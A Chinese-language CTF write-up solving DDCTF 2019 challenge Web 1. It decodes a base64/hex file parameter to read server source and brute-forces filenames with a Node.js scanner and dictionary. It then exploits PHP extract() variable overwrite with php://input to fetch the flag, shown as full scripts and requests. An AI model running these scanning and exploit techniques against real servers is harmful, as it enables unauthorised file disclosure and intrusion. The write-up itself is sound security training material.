## 0x01. Web 1 - 滴
### 题目
> 滴~  
> 
> http://117.51.150.246  

### 解题过程
访问题目入口会自动跳转到这个地址：

```text
http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09
```

拿到访问目标地址的 HTTP 包数据:

```http
GET /index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09 HTTP/1.1
Host: 117.51.150.246
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
DNT: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://117.51.150.246/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

HTTP/1.1 200 OK
Date: Thu, 18 Apr 2019 12:30:06 GMT
Server: Apache/2.4.7 (Unix) PHP/5.4.26
X-Powered-By: PHP/5.4.26
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html;charset=utf-8

<title>TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</title>flag.jpg</br>flag.jpg</br><img src='data:image/gif;base64,/9j/4AAQSkZ...'></img>
```

看起来 QueryString 中 `jpg` 的值似乎经过了 base64 编码，于是直接在浏览器的 console 里尝试对其解码：

```javascript
atob('TmpZMlF6WXhOamN5UlRaQk56QTJOdz09')
// <- "NjY2QzYxNjcyRTZBNzA2Nw=="
```

尝试二次 base64 解码：

```javascript
atob(atob('TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'))
// <- "666C61672E6A7067"
```

解出的值像是 Hex，尝试用 Node.js 转成字符串：

```javascript
Buffer.from('666C61672E6A7067', 'hex').toString()
// <- 'flag.jpg'
```

嗯哼~ 得到的值与响应体中输出的 `flag.jpg` 一致，猜测可以通过修改 `jpg` 的值输出指定文件内容。

那么首先构造出读取当前页面 (`index.php`) 源文件的地址：

```javascript
const { base64 } = require('../common/utils')

function encode (filename) {
  let hex = Buffer.from(filename).toString('hex')
  return base64.encode(base64.encode(hex))
}

let url = `http://117.51.150.246/index.php?jpg=${encode('index.php')}`
// <- "http://117.51.150.246/index.php?jpg=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3"
```

访问后发现页面上的字符串已经变成 `index.php`；然后提取出 `<img>` 的 `src` 值，[取出 base64 的部分](https://en.wikipedia.org/wiki/Data_URI_scheme#Syntax) 并做解码，便成功得到 [源文件内容](./clues/index.php)：

```php
<?php
/*
 * https://blog.csdn.net/FengBanLiuYun/article/details/80616607
 * Date: July 4,2018
 */
error_reporting(E_ALL || ~E_NOTICE);


header('content-type:text/html;charset=utf-8');
if(! isset($_GET['jpg']))
    header('Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09');
$file = hex2bin(base64_decode(base64_decode($_GET['jpg'])));
echo '<title>'.$_GET['jpg'].'</title>';
$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);
echo $file.'</br>';
$file = str_replace("config","!", $file);
echo $file.'</br>';
$txt = base64_encode(file_get_contents($file));

echo "<img src='data:image/gif;base64,".$txt."'></img>";
/*
 * Can you find the flag file?
 *
 */

?>
```

Review 代码后可以了解到：
1. 通过 `index.php` 接口可以读取指定文件内容（正如前面操作）;
2. 文件名的全部字符都先经白名单过滤，只允许英文、数字以及 `.` 通过；
3. 经过白名单过滤后，文件名再做黑名单过滤，`config` 将被转换成 `!`。

可以分析出：
1. 字符白名单天然挡掉了 `/`、`%`，杜绝了读取上级目录的可能；
2. 黑名单过滤存在明显的逻辑冲突，这导致最终文件名可以出现白名单中没有的 `!`；
3. 目前所能做的事情仅有读取指定文件，但我们仍未知道应该读取哪个文件。

那么剩下的线索只有 [文件头部注释的链接](https://blog.csdn.net/FengBanLiuYun/article/details/80616607) 了。
指过去的是 CSDN 的一篇博客 —— 「命令 echo」，但很明显此 `echo` 非 `index.php` 中的 `echo`，所以博文内容并没有包含什么有用的信息。

~~（倒是评论区已经开始「打卡」并「暴打出题人」了 wwwwww~~

于是尝试暴力扫描可能命中的文件，这里用 Node.js 快速写个脚本：

```javascript
const Queue = require('p-queue')
const Gauge = require('gauge')

const SCAN_CONCURRENCY = process.env.SCAN_CONCURRENCY || 5

async function scan (filenames, { fetch, isHit, concurrency = SCAN_CONCURRENCY }) {
  const queue = new Queue({ concurrency })
  const gauge = new Gauge()

  let count = 0
  let results = []

  queue.on('active', () => {
    gauge.show(`Fetching #${++count} / ${filenames.length}`, count / filenames.length)
  })

  filenames.forEach((filename) => queue.add(async () =>
    results.push(await fetch(filename)))
  )

  await queue.onIdle()
  gauge.hide()

  return results.filter(isHit)
}

const getStdin = require('get-stdin')
const got = require('got')
const cheerio = require('cheerio')
const flatten = require('just-flatten-it')
const { base64 } = require('../common/utils')

/**
 * Usage:
 *
 * ```sh
 * cat ./dict.txt | node ./scan.js
 * ```
 */
;(async () => {
  function encode (input) {
    let hex = Buffer.from(input).toString('hex')
    return base64.encode(base64.encode(hex))
  }

  async function fetch (filename) {
    const url = `http://117.51.150.246/index.php?jpg=${encode(filename)}`
    const { body } = await got(url)
    const $ = cheerio.load(body)
    return {
      filename,
      content: base64.decode($('img').attr('src').slice('data:image/gif;base64,'.length) || ''),
    }
  }

  function isHit (response) {
    return !!response.content
  }

  let filenames = (await getStdin())
    .split('\n')
    .map((s) => s.trim())
    .filter(Boolean)

  let hits = await scan(filenames, { fetch, isHit })
  process.stdout.write(JSON.stringify(hits, null, 2))
})()
```

然后从 GitHub 找一个 [敏感文件名字典](https://github.com/SwiftieTerrence/ctfwebscan/blob/master/dic.txt)，开始扫描：

```sh
curl -s https://raw.githubusercontent.com/SwiftieTerrence/ctfwebscan/a64f510/dic.txt | node ./scan.js
```

扫描结果：
```json
[
  {
    "filename": "index.php",
    "content": "<?php\r\n/*\r\n * https://blog.csdn.net/FengBanLiuYun/article/details/80616607\r\n * Date: July 4,2018\r\n */\r\nerror_reporting(E_ALL || ~E_NOTICE);\r\n\r\n\r\nheader('content-type:text/html;charset=utf-8');\r\nif(! isset($_GET['jpg']))\r\n    header('Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09');\r\n$file = hex2bin(base64_decode(base64_decode($_GET['jpg'])));\r\necho '<title>'.$_GET['jpg'].'</title>';\r\n$file = preg_replace(\"/[^a-zA-Z0-9.]+/\",\"\", $file);\r\necho $file.'</br>';\r\n$file = str_replace(\"config\",\"!\", $file);\r\necho $file.'</br>';\r\n$txt = base64_encode(file_get_contents($file));\r\n\r\necho \"<img src='data:image/gif;base64,\".$txt.\"'></img>\";\r\n/*\r\n * Can you find the flag file?\r\n *\r\n */\r\n\r\n?>\r\n"
  },
  {
    "filename": "robots.txt",
    "content": "excuse me?\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nflag{False flag}\r\n"
  }
]
```

无功而返，滴滴甚至还在 robots.txt 里放了个错误的 flag（感到深深的恶意。

~~那么这题至此就可以放弃了。~~

回到唯一的线索 —— [「命令 echo」](https://blog.csdn.net/FengBanLiuYun/article/details/80616607)。
翻遍作者的其它文章，~~通过阅读量和评论数~~ 找到另一篇文章 [「vim 异常退出 swp文件提示」](https://blog.csdn.net/FengBanLiuYun/article/details/80913909) ，似乎暗示着我们的目标是一个 vim 交换文件，于是针对文章中提到的三层交换文件修改扫描脚本：

```javascript
  // ...
  const flatten = require('just-flatten-it')

  let filenames = (await getStdin())
    .split('\n')
    .map((s) => s.trim())
    .filter(Boolean)
  
  filenames = flatten(filenames.map((name) => [
    name,
    `.${name}.swp`,
    `.${name}.swo`,
    `.${name}.swn`,
  ]))

  // ...
```

并把文中示例使用的文件名 `practice.txt` 也加入字典：

```sh
{ curl -s https://raw.githubusercontent.com/SwiftieTerrence/ctfwebscan/master/dic.txt ; echo "\npractice.txt" } | node ./scan.js
```

但依旧扫不到新的文件。

~~那么这题至此又可以放弃了。~~

在被这道关卡卡住一天之后，看着 `index.php` 中的 `</br>`，我鬼使神差地意识到出题人也许还犯了其他低级错误。于是把扫描脚本改为：

```diff
  filenames = flatten(filenames.map((name) => [
    name,
-    `.${name}.swp`,
+    `${name}.swp`,
-    `.${name}.swo`,
+    `${name}.swo`,
-    `.${name}.swn`,
+    `${name}.swn`,
  ]))
```

再次扫描，得到结果：

```json
[
  {
    "filename": "index.php",
    "content": "<?php\r\n/*\r\n * https://blog.csdn.net/FengBanLiuYun/article/details/80616607\r\n * Date: July 4,2018\r\n */\r\nerror_reporting(E_ALL || ~E_NOTICE);\r\n\r\n\r\nheader('content-type:text/html;charset=utf-8');\r\nif(! isset($_GET['jpg']))\r\n    header('Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09');\r\n$file = hex2bin(base64_decode(base64_decode($_GET['jpg'])));\r\necho '<title>'.$_GET['jpg'].'</title>';\r\n$file = preg_replace(\"/[^a-zA-Z0-9.]+/\",\"\", $file);\r\necho $file.'</br>';\r\n$file = str_replace(\"config\",\"!\", $file);\r\necho $file.'</br>';\r\n$txt = base64_encode(file_get_contents($file));\r\n\r\necho \"<img src='data:image/gif;base64,\".$txt.\"'></img>\";\r\n/*\r\n * Can you find the flag file?\r\n *\r\n */\r\n\r\n?>\r\n"
  },
  {
    "filename": "robots.txt",
    "content": "excuse me?\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nflag{False flag}\r\n"
  },
  {
    "filename": "practice.txt.swp",
    "content": "f1ag!ddctf.php"
  }
]
```

惊了。

心情复杂.jpg  
~~我替黄旭东祝滴滴越办越好~~

无论如何，终于还是拿到了下一个线索 `flag!ddctf.php`。
结合前面对 `index.php` 的解读，这一步就显得非常简单了：

```javascript
// ...
let url = `http://117.51.150.246/index.php?jpg=${encode('flagconfigddctf.php')}`
// <- "http://117.51.150.246/index.php?jpg=TmpZMll6WXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ=="
```

再用与前面相同的方法 —— 提取 `<img>` 的 `src`，并做 base64 解码；便轻松获取到了 `flag!ddctf.php` 的内容：

```php
<?php
include('config.php');
$k = 'hello';
extract($_GET);
if(isset($uid))
{
    $content=trim(file_get_contents($k));
    if($uid==$content)
        {
                echo $flag;
        }
        else
        {
                echo'hello';
        }
}

?>
```

Review 后发现这里涉及两个 ~~CTF~~ 常见的 PHP 的安全问题：
1. [extract() 变量覆盖](https://ctf-wiki.github.io/ctf-wiki/web/php/php/#extract)
2. [远程文件包含 - PHP 流 input](https://ctf-wiki.github.io/ctf-wiki/web/php/php/#_3)

构造请求参数 `k=php://input`，使 `$content` 值等于 Request Body 的内容；并把相同的值（如 `yelo`）传入参数 `uid` 和 Request Body；使得最终 `$uid == $content`：

```javascript
const got = require('got')

;(async () => {
  const url = `http://117.51.150.246/f1ag!ddctf.php?uid=yelo&k=php://input`
  const { body } = await got.post(url, {
    body: 'yelo',
  })
  console.log(body)
  // <- "DDCTF{436f6e67726174756c6174696f6e73}"
})()
```

获得 flag `DDCTF{436f6e67726174756c6174696f6e73}`，拿下第一关 :v:。

### Bonus
等一等，flag 的值看起来是一段 Hex，转字符串试试：

```javascript
Buffer.from(:436f6e67726174756c6174696f6e73', 'hex').toString()
// <- "Congratulations"
```

![](https://media.giphy.com/media/1g37uzZ6mSu8GDOczN/giphy.gif)  
![](https://media.giphy.com/media/8Rx1VaCae7OCs/giphy.gif)  

### 涉及资料
- 源代码
  - [扫描器脚本](./scan.js)
  - [完整通关脚本](./index.js)
- 知识点
  - [data URI scheme - Syntax](https://en.wikipedia.org/wiki/Data_URI_scheme#Syntax)
  - [Node.js - Buffer](https://nodejs.org/dist/latest-v11.x/docs/api/buffer.html)
  - [PHP extract() 变量覆盖](https://ctf-wiki.github.io/ctf-wiki/web/php/php/#extract)
  - [PHP 远程文件包含 - PHP 流 input](https://ctf-wiki.github.io/ctf-wiki/web/php/php/#_3)
